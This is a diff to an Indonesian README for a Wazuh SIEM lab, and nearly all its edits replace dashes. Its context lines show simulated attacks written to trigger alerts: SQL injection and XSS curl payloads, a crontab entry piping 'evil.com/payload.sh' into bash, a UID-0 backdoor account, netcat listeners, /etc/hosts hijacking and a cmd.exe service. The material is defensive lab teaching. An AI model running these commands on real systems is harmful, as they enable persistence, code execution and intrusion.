@@ -66,7 +66,7 @@ Wazuh adalah platform keamanan open-source yang menyediakan:
 | Wazuh Manager | Menerima & menganalisis log dari semua agent | 1514, 1515 |
 | Wazuh Indexer | Database (OpenSearch) untuk menyimpan alert | 9200 |
 | Wazuh Dashboard | Web UI untuk visualisasi & monitoring | 443 |
-| Wazuh Agent | Mengumpulkan log di tiap laptop & kirim ke manager | — |
+| Wazuh Agent | Mengumpulkan log di tiap laptop & kirim ke manager | - |
 
 ### Alur Kerja Sistem
 
@@ -225,7 +225,7 @@ Buka `https://70.153.19.42` → klik **Advanced** → **Proceed** → login deng
 1. Buka `https://70.153.19.42` → **Agents** → **Deploy new agent**
 2. Pilih OS → masukkan IP Manager → copy-paste command yang digenerate
 
-### Manual — Linux/Kali
+### Manual - Linux/Kali
 
 ```bash
 # Import GPG key & repository
@@ -245,7 +245,7 @@ sudo systemctl enable wazuh-agent
 sudo systemctl start wazuh-agent
 ```
 
-### Manual — Windows
+### Manual - Windows
 
 ```cmd
 REM Download dari: https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.0-1.msi
@@ -254,7 +254,7 @@ wazuh-agent-4.9.0-1.msi /q WAZUH_MANAGER="70.153.19.42" WAZUH_REGISTRATION_SERVE
 net start WazuhSvc
 ```
 
-### Manual — macOS
+### Manual - macOS
 
 ```bash
 curl -so wazuh-agent.pkg https://packages.wazuh.com/4.x/macos/wazuh-agent-4.9.0-1.intel64.pkg
@@ -272,7 +272,7 @@ sudo /var/ossec/bin/agent_control -l
 ![List Agent](Documentation/list-agent.png)
 *Daftar agent yang terhubung ke Wazuh Manager*
 
-### Konfigurasi Agent — FIM & Log Collection
+### Konfigurasi Agent - FIM & Log Collection
 
 Edit `/var/ossec/etc/ossec.conf` di agent:
 
@@ -307,7 +307,7 @@ sudo /Library/Ossec/bin/wazuh-control restart  # macOS
 
 ---
 
-## Setup Malware Detection — VirusTotal Integration
+## Setup Malware Detection - VirusTotal Integration
 
 ### Step 1: Dapatkan API Key VirusTotal (Gratis)
 
@@ -339,7 +339,7 @@ Tambahkan di dalam `<ossec_config>` (sebelum tag penutup):
 systemctl restart wazuh-manager
 ```
 
-### Step 3: Validasi — EICAR Test File
+### Step 3: Validasi - EICAR Test File
 
 ```bash
 # Jalankan di agent
@@ -373,7 +373,7 @@ sudo cat /var/ossec/etc/ossec.conf | grep api_key
 *Tampilan overview Wazuh Dashboard*
 
 ![Grafik Threat Hunting](Documentation/grafik%20Threat%20Hunting.png)
-*Grafik Threat Hunting — distribusi alert berdasarkan waktu dan rule*
+*Grafik Threat Hunting - distribusi alert berdasarkan waktu dan rule*
 
 ---
 
@@ -401,7 +401,7 @@ SSH Brute Force adalah serangan di mana penyerang mencoba login ke SSH server me
 
 Script dijalankan di Agent 1, menggunakan 3 metode berurutan:
 
-**Metode 1 — Failed SSH login (15 percobaan):**
+**Metode 1 - Failed SSH login (15 percobaan):**
 ```bash
 # Jika sshpass tersedia, langsung SSH dengan password salah
 sshpass -p "wrongpassword" ssh hacker@localhost
@@ -410,7 +410,7 @@ sshpass -p "wrongpassword" ssh hacker@localhost
 logger -p auth.warning "sshd: Failed password for invalid user hacker_1 from 10.10.10.1 port 2001 ssh2"
 ```
 
-**Metode 2 — Multiple username brute force:**
+**Metode 2 - Multiple username brute force:**
 ```bash
 USERS=("admin" "root" "test" "user" "ubuntu" "mysql" "postgres")
 for user in "${USERS[@]}"; do
@@ -418,7 +418,7 @@ for user in "${USERS[@]}"; do
 done
 ```
 
-**Metode 3 — Rapid-fire 30 percobaan cepat (trigger alert level tinggi):**
+**Metode 3 - Rapid-fire 30 percobaan cepat (trigger alert level tinggi):**
 ```bash
 for i in $(seq 1 30); do
     logger -p auth.crit "sshd: Failed password for invalid user attacker from 10.0.0.66 port $((3000+i)) ssh2"
@@ -426,7 +426,7 @@ for i in $(seq 1 30); do
 done
 ```
 
-Metode ketiga mengirim log dengan prioritas `auth.crit` dalam interval 0.1 detik — cukup cepat untuk memicu rule brute force di Wazuh.
+Metode ketiga mengirim log dengan prioritas `auth.crit` dalam interval 0.1 detik - cukup cepat untuk memicu rule brute force di Wazuh.
 
 ### Rule yang Terpicu
 
@@ -435,8 +435,8 @@ Metode ketiga mengirim log dengan prioritas `auth.crit` dalam interval 0.1 detik
 | 5710 | Attempt to login using a non-existent user | 5 |
 | 5712 | Multiple authentication failures | 10 |
 | 5763 | SSH brute force attack detected | 12 |
-| 100001 | [Custom] SSH Brute Force — 5+ failed login dalam 2 menit | 10 |
-| 100002 | [Custom] Massive SSH Brute Force — 10+ failed login | 13 |
+| 100001 | [Custom] SSH Brute Force - 5+ failed login dalam 2 menit | 10 |
+| 100002 | [Custom] Massive SSH Brute Force - 10+ failed login | 13 |
 
 ### Cara Jalankan
 ```bash
@@ -448,10 +448,10 @@ bash scripts/attack-bruteforce.sh <IP_TARGET>
 ### Hasil di Terminal
 
 ![Bruteforce Terminal](Documentation/bruteforce.jpeg)
-*Output terminal saat script brute force dijalankan — terlihat 943 hits terdeteksi di Threat Hunting Dashboard dengan rule ID 5710*
+*Output terminal saat script brute force dijalankan - terlihat 943 hits terdeteksi di Threat Hunting Dashboard dengan rule ID 5710*
 
 ![Bruteforce Hits](Documentation/tambahan.jpeg)
-*Threat Hunting menampilkan 943 hits dari agent kworung — rule ID 19009 "System audit for Unix based systems" - membuktikan volume serangan brute force yang tinggi*
+*Threat Hunting menampilkan 943 hits dari agent kworung - rule ID 19009 "System audit for Unix based systems" - membuktikan volume serangan brute force yang tinggi*
 
 ### Cara Cek di Dashboard
 ```
@@ -482,7 +482,7 @@ curl "http://localhost/api?param=' UNION ALL SELECT NULL,NULL,table_name FROM in
 # + 5 payload lainnya
 ```
 
-**2. XSS — Cross-Site Scripting (8 payload):**
+**2. XSS - Cross-Site Scripting (8 payload):**
 ```bash
 curl "http://localhost/search?q=<script>alert('XSS')</script>"
 curl "http://localhost/page?name=<img src=x onerror=alert(1)>"
@@ -526,12 +526,12 @@ bash scripts/attack-web.sh <IP_TARGET>
 ### Hasil di Terminal
 
 ![SQL Terminal](Documentation/sql.jpeg)
-*Output terminal saat attack-web.sh dijalankan — terlihat payload SQL Injection dan XSS dikirim satu per satu*
+*Output terminal saat attack-web.sh dijalankan - terlihat payload SQL Injection dan XSS dikirim satu per satu*
 
 ### Hasil di Dashboard
 
 ![SQL Dashboard](Documentation/sqlout.jpeg)
-*Wazuh Dashboard menampilkan alert web attack dari agent — rule ID 31103–31110 terpicu*
+*Wazuh Dashboard menampilkan alert web attack dari agent - rule ID 31103–31110 terpicu*
 
 ### Cara Cek di Dashboard
 ```
@@ -546,13 +546,13 @@ agent.name: DESKTOP-8EBI1VU
 
 ### Deskripsi
 
-FIM adalah mekanisme yang memantau perubahan file dan direktori sensitif secara real-time. Wazuh menggunakan modul `syscheck` yang menghitung checksum file. Setiap perubahan — penambahan, modifikasi, penghapusan, atau perubahan permission — langsung memicu alert.
+FIM adalah mekanisme yang memantau perubahan file dan direktori sensitif secara real-time. Wazuh menggunakan modul `syscheck` yang menghitung checksum file. Setiap perubahan, yaitu penambahan, modifikasi, penghapusan, atau perubahan permission langsung memicu alert.
 
 ### Script: `attack-fim.sh`
 
 Dijalankan di Agent 3 dengan `sudo`. Script mensimulasikan 6 tahap serangan:
 
-**Tahap 1 — Buat file sensitif:**
+**Tahap 1 - Buat file sensitif:**
 ```bash
 echo "DATABASE_URL=mysql://admin:password123@localhost:3306/production" > /tmp/fim-test/database.env
 echo "API_KEY=sk-live-1234567890abcdef" > /tmp/fim-test/api-keys.txt
@@ -560,33 +560,33 @@ echo "AWS_SECRET=AKIAIOSFODNN7EXAMPLE" > /tmp/fim-test/aws-credentials.txt
 # Tunggu 30 detik → Wazuh scan awal & catat hash asli
 ```
 
-**Tahap 2 — Modifikasi isi file (simulasi tamper):**
+**Tahap 2 - Modifikasi isi file (simulasi tamper):**
 ```bash
 echo "DATABASE_URL=mysql://hacker:pwned@evil-server.com:3306/stolen" > /tmp/fim-test/database.env
 echo "API_KEY=sk-live-STOLEN_BY_ATTACKER" > /tmp/fim-test/api-keys.txt
 # Hash berubah → Wazuh alert!
 ```
 
-**Tahap 3 — Ubah permission (melemahkan keamanan):**
+**Tahap 3 - Ubah permission (melemahkan keamanan):**
 ```bash
 chmod 777 /tmp/fim-test/database.env   # world-readable/writable
 chmod 777 /tmp/fim-test/api-keys.txt
 chown nobody:nogroup /tmp/fim-test/aws-credentials.txt
 ```
 
-**Tahap 4 — Hapus file (menghapus jejak):**
+**Tahap 4 - Hapus file (menghapus jejak):**
 ```bash
 rm -f /tmp/fim-test/aws-credentials.txt
 ```
 
-**Tahap 5 — DNS hijacking simulation:**
+**Tahap 5 - DNS hijacking simulation:**
 ```bash
 echo "10.10.10.10 google.com"   >> /etc/hosts
 echo "10.10.10.10 facebook.com" >> /etc/hosts
 echo "10.10.10.10 bank.com"     >> /etc/hosts
 ```
 
-**Tahap 6 — Buat script berbahaya:**
+**Tahap 6 - Buat script berbahaya:**
 ```bash
 # Simulated backdoor (tidak fungsional)
 cat > /tmp/fim-test/backdoor.sh << 'SCRIPT'
@@ -631,15 +631,15 @@ sudo rm /etc/hosts.backup.fim-demo
 ### Hasil di Terminal
 
 ![FIM Terminal](Documentation/attack-fim.png)
-*Output terminal saat attack-fim.sh dijalankan — menampilkan 6 tahap simulasi*
+*Output terminal saat attack-fim.sh dijalankan - menampilkan 6 tahap simulasi*
 
 ### Hasil di Dashboard
 
 ![FIM Dashboard](Documentation/dashboard%20FIM.png)
-*Dashboard FIM Wazuh — menampilkan file yang ditambah, diubah, dan dihapus*
+*Dashboard FIM Wazuh - menampilkan file yang ditambah, diubah, dan dihapus*
 
 ![FIM Dashboard 2](Documentation/dashboard%20FIM%202.png)
-*Detail event FIM — terlihat syscheck.path, jenis perubahan (added/modified/deleted)*
+*Detail event FIM - terlihat syscheck.path, jenis perubahan (added/modified/deleted)*
 
 ![Grafik FIM](Documentation/grafik%20FIM.png)
 *Grafik distribusi alert FIM berdasarkan waktu*
@@ -668,7 +668,7 @@ Rootkit adalah software berbahaya yang menyembunyikan keberadaannya dari sistem 
 
 Dijalankan di Agent 3 dengan `sudo`:
 
-**Simulasi 1 — Hidden file (indikator rootkit):**
+**Simulasi 1 - Hidden file (indikator rootkit):**
 ```bash
 touch /dev/.hidden_backdoor
 touch /dev/.secret_channel
@@ -677,7 +677,7 @@ mkdir -p /tmp/.hidden_dir
 echo "C2 server: evil.com:8080" > /tmp/.hidden_dir/.config
 ```
 
-**Simulasi 2 — User mencurigakan:**
+**Simulasi 2 - User mencurigakan:**
 ```bash
 useradd -M -s /bin/bash backdoor_user
 useradd -M -s /bin/bash hacker
@@ -685,7 +685,7 @@ useradd -M -s /bin/bash hacker
 useradd -o -u 0 -g 0 -M -d /root -s /bin/bash superroot
 ```
 
-**Simulasi 3 — Proses mencurigakan:**
+**Simulasi 3 - Proses mencurigakan:**
 ```bash
 # Fake crypto miner
 nohup bash -c 'while true; do echo "mining..." > /dev/null; sleep 60; done' &
@@ -694,13 +694,13 @@ nohup bash -c 'while true; do echo "mining..." > /dev/null; sleep 60; done' &
 nohup bash -c 'while true; do sleep 30; done' &
 ```
 
-**Simulasi 4 — Network backdoor:**
+**Simulasi 4 - Network backdoor:**
 ```bash
 nc -l -p 4444 &   # backdoor listener
 nc -l -p 8888 &   # backdoor listener cadangan
 ```
 
-**Simulasi 5 — Crontab berbahaya (persistensi):**
+**Simulasi 5 - Crontab berbahaya (persistensi):**
 ```bash
 (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_dir/.config") | crontab -
 (crontab -l 2>/dev/null; echo "0 * * * * curl http://evil.com/payload.sh | bash") | crontab -
@@ -742,7 +742,7 @@ done
 | 5901 | New user account created | 8 |
 | 5903 | Non-root user with UID 0 (potential backdoor) | 12 |
 | 87103 | VirusTotal: No records found (possible custom malware) | 3 |
-| 87104 | VirusTotal: Alert — file flagged | 3 |
+| 87104 | VirusTotal: Alert - file flagged | 3 |
 | 87105 | VirusTotal: Malware detected | 15 |
 | 100031 | [Custom] User baru dengan root privileges (UID 0) | 14 |
 | 100040 | [Custom] Netcat listener terdeteksi (potential backdoor) | 12 |
@@ -768,12 +768,12 @@ crontab /tmp/crontab_backup.txt
 ### Hasil di Terminal
 
 ![Malware Terminal](Documentation/malware.jpeg)
-*Output terminal attack-malware.sh — 4 langkah simulasi selesai dengan status [DONE]*
+*Output terminal attack-malware.sh - 4 langkah simulasi selesai dengan status [DONE]*
 
 ### Hasil di Dashboard
 
 ![Malware Dashboard](Documentation/malwareout.jpeg)
-*Threat Hunting menampilkan 34 hits — rule ID 510 dengan deskripsi "Trojaned version of file detected" dan "Process hidden from kill command"*
+*Threat Hunting menampilkan 34 hits - rule ID 510 dengan deskripsi "Trojaned version of file detected" dan "Process hidden from kill command"*
 
 ![Grafik Malware](Documentation/grafik%20malware%20detection.png)
 *Grafik distribusi alert Malware Detection*
@@ -781,14 +781,14 @@ crontab /tmp/crontab_backup.txt
 ### VirusTotal Integration
 
 ![VirusTotal](Documentation/grafik%20virus%20total.png)
-*Grafik hasil VirusTotal integration — file yang dipindai otomatis saat muncul di direktori yang dimonitor*
+*Grafik hasil VirusTotal integration - file yang dipindai otomatis saat muncul di direktori yang dimonitor*
 
 ![VirusTotal 2](Documentation/grafik%20virus%20total%202.png)
 
 ![VirusTotal 3](Documentation/grafik%20virus%20total%203.png)
 
 ![VirusTotal Out](Documentation/virtout.jpeg)
-*Threat Hunting — rule ID 87103 "No records in VirusTotal" dan 87104 "VirusTotal Alert" dari agent kworung*
+*Threat Hunting - rule ID 87103 "No records in VirusTotal" dan 87104 "VirusTotal Alert" dari agent kworung*
 
 ### Cara Cek di Dashboard
 ```
@@ -825,7 +825,7 @@ done'
 ```
 
 Setiap iterasi menginjeksikan 2 entri log:
-1. Kegagalan `sudo` — field `uid=1000 euid=0` menandakan user biasa mencoba akses root
+1. Kegagalan `sudo` - field `uid=1000 euid=0` menandakan user biasa mencoba akses root
 2. Kegagalan `su` dari user `hacker` ke `root`
 
 ### Rule yang Terpicu
@@ -835,18 +835,18 @@ Setiap iterasi menginjeksikan 2 entri log:
 | 5401 | Unsuccessful sudo command | 5 |
 | 5404 | 3+ consecutive sudo failures | 9 |
 | 5301 | su session failed | 5 |
-| 100030 | [Custom] Multiple sudo failures — 3+ dalam 2 menit | 10 |
+| 100030 | [Custom] Multiple sudo failures - 3+ dalam 2 menit | 10 |
 | 100031 | [Custom] User baru dengan UID 0 (root equivalent) | 14 |
 
 ### Hasil di Terminal
 
 ![Priv Terminal](Documentation/priv.jpeg)
-*Output terminal — field uid=1000 euid=0 terlihat jelas, menunjukkan user biasa coba akses root*
+*Output terminal - field uid=1000 euid=0 terlihat jelas, menunjukkan user biasa coba akses root*
 
 ### Hasil di Dashboard
 
 ![Priv Dashboard](Documentation/privout.jpeg)
-*Dashboard menampilkan alert rule level 9 "User missed the password to change UID to root" — rule.firedtimes terus naik (36, 37, 38, 39, 40)*
+*Dashboard menampilkan alert rule level 9 "User missed the password to change UID to root" - rule.firedtimes terus naik (36, 37, 38, 39, 40)*
 
 ### Cara Cek di Dashboard
 ```
@@ -915,7 +915,7 @@ done
 | 1002 | Unknown/anomalous system event | 6 |
 | 20101 | High traffic anomaly detected | 8 |
 
-> Deteksi DDoS lewat custom rules tidak ada secara spesifik — alert yang muncul mayoritas berasal dari rule bawaan Wazuh level medium (6–8) via log injection `logger`.
+> Deteksi DDoS lewat custom rules tidak ada secara spesifik - alert yang muncul mayoritas berasal dari rule bawaan Wazuh level medium (6–8) via log injection `logger`.
 
 ### Cara Jalankan
 ```bash
@@ -931,7 +931,7 @@ sudo bash scripts/attack-ddos.sh
 *Dashboard menampilkan spike alert saat DDoS simulation dijalankan*
 
 ![DDoS Dashboard 2](Documentation/dashboard%20ddos%20attack%202.png)
-*Detail event DDoS — terlihat log anomali dari logger injection*
+*Detail event DDoS - terlihat log anomali dari logger injection*
 
 ### Cara Cek di Dashboard
 ```
@@ -946,7 +946,7 @@ agent.name: DESKTOP-8EBI1VU
 
 ### Deskripsi
 
-Penyerang sering membuat Windows Service palsu untuk menjaga persistensi di sistem korban. Service dengan nama generik seperti `updater` yang pointnya ke `cmd.exe` adalah indikator kuat aktivitas mencurigakan. Wazuh mendeteksi ini dari Windows Event Log (Event ID 7045 — service baru dibuat).
+Penyerang sering membuat Windows Service palsu untuk menjaga persistensi di sistem korban. Service dengan nama generik seperti `updater` yang pointnya ke `cmd.exe` adalah indikator kuat aktivitas mencurigakan. Wazuh mendeteksi ini dari Windows Event Log (Event ID 7045 - service baru dibuat).
 
 ### Script: `attack-service.bat`
 
@@ -954,7 +954,7 @@ Dijalankan di Agent 2 (Windows) sebagai Administrator:
 
 ```bat
 @echo off
-REM Buat service mencurigakan — binary-nya cmd.exe (red flag besar)
+REM Buat service mencurigakan - binary-nya cmd.exe (red flag besar)
 sc create updater binPath= "C:\Windows\System32\cmd.exe"
 
 REM Query untuk verifikasi service terbuat
@@ -965,9 +965,9 @@ sc delete updater
 ```
 
 Tiga langkah yang disimulasikan:
-1. **`sc create`** — membuat service `updater` dengan binary `cmd.exe`. Ini sangat mencurigakan karena service legitimate tidak pernah langsung memanggil command prompt.
-2. **`sc query`** — verifikasi service berhasil dibuat. Output menunjukkan `STATE: STOPPED` dan `TYPE: WIN32_OWN_PROCESS`.
-3. **`sc delete`** — menghapus service untuk membersihkan jejak, tapi Wazuh sudah keburu mencatat event pembuatannya.
+1. **`sc create`** - membuat service `updater` dengan binary `cmd.exe`. Ini sangat mencurigakan karena service legitimate tidak pernah langsung memanggil command prompt.
+2. **`sc query`** - verifikasi service berhasil dibuat. Output menunjukkan `STATE: STOPPED` dan `TYPE: WIN32_OWN_PROCESS`.
+3. **`sc delete`** - menghapus service untuk membersihkan jejak, tapi Wazuh sudah keburu mencatat event pembuatannya.
 
 ### Rule yang Terpicu
 
@@ -987,12 +987,12 @@ attack-service.bat
 ### Hasil di Terminal
 
 ![Service Terminal](Documentation/2.png)
-*Output CMD saat attack-service.bat dijalankan — terlihat `[SC] CreateService SUCCESS`, detail service `updater` (TYPE: WIN32_OWN_PROCESS, STATE: STOPPED), lalu `[SC] DeleteService SUCCESS`*
+*Output CMD saat attack-service.bat dijalankan - terlihat `[SC] CreateService SUCCESS`, detail service `updater` (TYPE: WIN32_OWN_PROCESS, STATE: STOPPED), lalu `[SC] DeleteService SUCCESS`*
 
 ### Hasil di Dashboard
 
 ![Service Dashboard](Documentation/1.png)
-*Threat Hunting Dashboard dari agent `Ascala` (Windows) — terlihat alert "New Windows Service Created" (rule ID 61138, level 5), "User account disabled or deleted" (60111, level 8), "Administrators Group Changed" (60154, level 12), dan berbagai Windows event lainnya pada 18 Mei 2026 pukul 23:34–23:36*
+*Threat Hunting Dashboard dari agent `Ascala` (Windows) - terlihat alert "New Windows Service Created" (rule ID 61138, level 5), "User account disabled or deleted" (60111, level 8), "Administrators Group Changed" (60154, level 12), dan berbagai Windows event lainnya pada 18 Mei 2026 pukul 23:34–23:36*
 
 ### Cara Cek di Dashboard
 ```
@@ -1015,14 +1015,14 @@ File: `rules/custom-rules.xml`
 
 | Rule ID | Level | Kategori | Deskripsi |
 |---------|-------|----------|-----------|
-| 100001 | 10 | Brute Force | SSH Brute Force terdeteksi — 5+ failed login dalam 2 menit |
-| 100002 | 13 | Brute Force | Massive SSH Brute Force — 10+ failed login attempts |
+| 100001 | 10 | Brute Force | SSH Brute Force terdeteksi - 5+ failed login dalam 2 menit |
+| 100002 | 13 | Brute Force | Massive SSH Brute Force - 10+ failed login attempts |
 | 100010 | 10 | Web Attack | SQL Injection terdeteksi di web request |
 | 100011 | 10 | Web Attack | XSS (Cross-Site Scripting) terdeteksi di web request |
-| 100012 | 10 | Web Attack | Directory Traversal — percobaan akses file sistem |
+| 100012 | 10 | Web Attack | Directory Traversal - percobaan akses file sistem |
 | 100020 | 10 | FIM | File konfigurasi penting diubah di `/etc/` |
 | 100021 | 12 | FIM | File executable sistem dimodifikasi (`/usr/bin/`, `/bin/`, dll) |
-| 100030 | 10 | Privilege Escalation | Multiple sudo failures — 3+ gagal dalam 2 menit |
+| 100030 | 10 | Privilege Escalation | Multiple sudo failures - 3+ gagal dalam 2 menit |
 | 100031 | 14 | Privilege Escalation | User baru dibuat dengan root privileges (UID 0) |
 | 100040 | 12 | Suspicious Activity | Netcat listener terdeteksi (potential backdoor) |
 | 100041 | 14 | Suspicious Activity | Reverse shell attempt terdeteksi |
@@ -1049,7 +1049,7 @@ Alert otomatis dikirim ke Telegram setiap ada event level ≥ 3. Bot: `@wazuhale
 *Contoh notifikasi alert yang masuk ke Telegram*
 
 ![Telegram 4](Documentation/integrasi%20bot%20tele%204.png)
-*Format pesan alert Telegram — Level, Rule ID, Agent, Deskripsi*
+*Format pesan alert Telegram - Level, Rule ID, Agent, Deskripsi*
 
 ---
 
@@ -1091,9 +1091,9 @@ dalam periode waktu tertentu. Terlalu sedikit log = ancaman tidak terdeteksi.
 Terlalu banyak log = sistem kewalahan & sulit dianalisis.
 
 Wazuh menangani ini dengan:
-- **Rule-based filtering** — hanya log yang cocok rule yang jadi alert
-- **Frequency threshold** — butuh X kejadian dalam Y menit baru trigger alert
-- **Level prioritization** — alert diurutkan level 1–15, admin fokus ke level tinggi
+- **Rule-based filtering** - hanya log yang cocok rule yang jadi alert
+- **Frequency threshold** - butuh X kejadian dalam Y menit baru trigger alert
+- **Level prioritization** - alert diurutkan level 1–15, admin fokus ke level tinggi
 
 ---
 
@@ -1148,7 +1148,7 @@ Admin cukup fokus ke level ≥ 10 untuk ancaman serius:
 - Level 13–15 → Critical → respons instan
 
 **3. Index Rotation**
-Alert disimpan per hari — mencegah satu index membengkak dan 
+Alert disimpan per hari - mencegah satu index membengkak dan 
 mempercepat query saat investigasi insiden.
 
 **4. Real-time vs Scheduled Scan**
@@ -1166,13 +1166,13 @@ Distribusi alert dapat dilihat di Wazuh Dashboard:
 - **Compliance** → distribusi berdasarkan standar (GDPR, HIPAA, NIST, PCI DSS)
 
 ![Threat Hunting Spike](Documentation/grafik%20Threat%20Hunting.png)
-*Grafik Threat Hunting — spike log terlihat jelas saat simulasi serangan dijalankan*
+*Grafik Threat Hunting - spike log terlihat jelas saat simulasi serangan dijalankan*
 
 ![Overview Dashboard](Documentation/overview-dashboard.png)
-*Overview Dashboard — distribusi alert dari 3 agent (macOS, Windows, Kali Linux)*
+*Overview Dashboard - distribusi alert dari 3 agent (macOS, Windows, Kali Linux)*
 
 ![MITRE Distribution](Documentation/grafik%20mitre%20att%26ck.png)
-*Distribusi serangan berdasarkan MITRE ATT&CK — log terdistribusi ke berbagai teknik serangan*
+*Distribusi serangan berdasarkan MITRE ATT&CK - log terdistribusi ke berbagai teknik serangan*
 
 Spike traffic terlihat jelas di grafik saat simulasi serangan dijalankan,
 membuktikan Wazuh mampu mendeteksi anomali pola log secara real-time.
